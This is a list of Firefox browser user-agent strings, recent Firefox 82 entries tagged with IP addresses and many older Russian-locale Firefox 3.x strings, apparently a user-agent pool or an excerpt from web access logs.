Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.36.176.190]
Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.3.222.41]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:213.32.4.115]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:82.51.146.16]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.40.213.54]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.45.251.113]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.65.97.5]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.114.22.213]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:82.57.190.115]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:37.163.248.60]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.239.82.178]
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 [ip:87.2.122.84]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.133.74.74]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.117.93.19]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.36.225.23]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.42.0.154]
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:37.163.32.60]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:60.53.241.107]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:151.36.135.3]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.6.117.212]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.43.49.154]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.18.176.66]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:109.114.101.36]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0 [ip:94.71.68.235]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.19.102.115]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.42.133.240]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.34.81.106]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.135.46.154]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:84.223.239.140]
Mozilla/5.0 (Windows NT 10.0; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:176.206.50.100]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 [ip:78.134.35.18]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.35.211.58]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:5.95.193.93]
Mozilla/5.0 (Android 10; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:151.82.215.93]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:212.216.150.230]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.73.176.227]
Mozilla/5.0 (Android 7.0; Mobile; rv:81.0) Gecko/81.0 Firefox/81.0 [ip:47.60.37.211]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:92.75.212.175]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:95.252.209.20]
Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 [ip:213.32.4.115]
Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 [ip:213.32.4.81]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.185.224]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.41.63.217]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.39.150.47]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:62.10.71.124]
Mozilla/5.0 (Windows NT 6.1; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:87.2.177.99]
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:93.147.197.163]
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 [ip:79.41.216.12]
Mozilla/5.0 (Android 9; Mobile; rv:82.0) Gecko/82.0 Firefox/82.0 [ip:37.176.117.126]
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0 [ip:79.27.1.145]
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:77.32.36.61]
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b2) Gecko/2007121120 AdCentriaIM/1.7 Firefox/3.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB5
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 FirePHP/0.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.4 (build 02652) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/2.0.0.12;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.18) Gecko/20081029 MRA 5.5 (build 02842) Firefox/2.0.0.18 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 WebMoney Advisor
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9) Gecko/2008052906 Firefox/3.0 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 MRA 5.5 (build 02842) Firefox/3.0.5;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091007 MRA 5.4 (build 02652) Firefox/3.5.4 GTB5
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.14) Gecko/2009090216 Ubuntu/8.04 (hardy) Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.5pre) Gecko/20091009 Ubuntu/9.04 (jaunty) Shiretoko/3.5.5pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.3 (build 02546) Firefox/3.5.3
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3) Gecko/20090910 Ubuntu/9.04 (jaunty) Shiretoko/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 (.NET CLR 1.1.4322) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091007 MRA 5.4 (build 02625) Firefox/3.5.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.4 (build 02620) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 sputnik unknown
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.14) Gecko/2009090905 Fedora/3.0.14-1.fc10 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.4 (build 02652) Firefox/3.5.4 GTB5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/2.0.0.2;MEGAUPLOAD 1.0 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.5 (build 02842) Firefox/3.5.3 sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 AdCentriaIM/1.7 Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.4) Gecko/20091028 Ubuntu/9.10 (karmic) Firefox/3.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.5 (build 02842) Firefox/3.5.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.3 (build 02552) Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.3) Gecko/20041002 Firefox/0.10
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.0.14) Gecko/2009090900 SUSE/3.0.14-0.1 Firefox/3.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.5 (build 02842) Firefox/3.5 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.4 (build 02652) Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.12) Gecko/2009070611 MRA 5.5 (build 02842) Firefox/3.0.12 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02743) Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.4 (build 02647) Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.4 (build 02652) Firefox/3.5.5 GTB5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.9) Gecko/2009040821 Firefox/3.0.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 AdCentriaIM/1.7 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2b2) Gecko/20091108 Firefox/3.6b2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1) Gecko/20090630 Fedora/3.5-1.fc11 Firefox/3.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 FirePHP/0.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 Firefox/2.0.0.5 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.5) Gecko/20091105 Fedora/3.5.5-1.fc12 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.5 (build 02842) Firefox/3.5 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 AdCentriaIM/1.7 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 GTB5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 AdCentriaIM/1.7 Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.4 (build 02647) Firefox/3.5.5
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.5) Gecko/20091109 Ubuntu/9.10 (karmic) Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02761) Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.4 (build 02652) Firefox/3.0.15 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.4 (build 02652) Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 03122) Firefox/3.5.5 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.4 (build 02647) Firefox/3.5.5 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.6) Gecko/20070725 MRA 5.4 (build 02650) AdCentriaIM/1.7 Firefox/2.0.0.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 sputnik unknown WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/2.0.0.2;MEGAUPLOAD 1.0 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 (FF696D6C-D357-8493-A3E3-A6279793C1F5) Firefox/3.0.16 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.4 (build 02647) Firefox/2.0.0.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02842) Firefox/3.0.16 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 AdCentriaIM/1.7 Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02647) Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02647) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02652) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 sputnik 2.0.1.41
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.0.11) Gecko/2009061118 Fedora/3.0.11-1.fc9 Firefox/3.0.11
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.5 (build 02842) Firefox/3.5.2 sputnik 2.0.1.41
Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.15) Gecko/2009102704 Fedora/3.0.15-1.fc10 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02842) Firefox/3.0.16 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02761) Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.1.6) Gecko/20091216 Fedora/3.5.6-1.fc11 Firefox/3.5.6
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.6) Gecko/20091216 Mandriva Linux/1.9.1.6-0.1mdv2010.0 (2010.0) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02743) Firefox/3.0.16
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.6 (build 03278) Firefox/3.0.1 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.4 (build 02647) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 AdCentriaIM/1.7 Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.4 (build 02652) Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02761) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.3 (build 02557) Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.7) Gecko/20100106 Ubuntu/9.10 (karmic) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.1.7) Gecko/20100106 Ubuntu/9.10 (karmic) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.5;MEGAUPLOAD 1.0 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729) FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.9) Gecko/2009040821 Firefox/3.0.9
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:79.33.55.137]
